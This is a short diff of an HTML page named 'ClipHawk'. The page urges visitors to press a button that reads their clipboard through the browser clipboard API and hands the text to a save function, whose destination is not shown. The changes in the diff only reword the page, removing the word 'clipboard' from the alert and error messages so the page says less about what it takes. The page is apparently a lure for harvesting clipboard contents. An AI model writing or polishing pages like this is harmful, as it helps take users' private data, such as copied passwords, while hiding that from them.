@@ -8,7 +8,7 @@
     <title>ClipHawk</title>
 </head>
 <body>
-    <h1>PLEASE! Press Button </h1>
+    <h2>PLEASE! Press Button </h2>
     <button onclick="getClipboardContent()">Click Me</button>
     <script>
         async function getClipboardContent() {
@@ -18,10 +18,10 @@
                     const text = await navigator.clipboard.readText();
                     saveClipboardContent(text);
                 } else {
-                    alert("Clipboard access denied.");
+                    alert(" Denied ");
                 }
             } catch (err) {
-                console.error("Failed to read clipboard contents: ", err);
+                console.error("Failed to read contents: ", err);
             }
         }
 
@@ -41,7 +41,7 @@
                 //     alert('Failed to save content');
                 // }
             } catch (err) {
-                console.error('Failed to save clipboard content:', err);
+                console.error('Failed to save content:', err);
             }
         }
     </script>
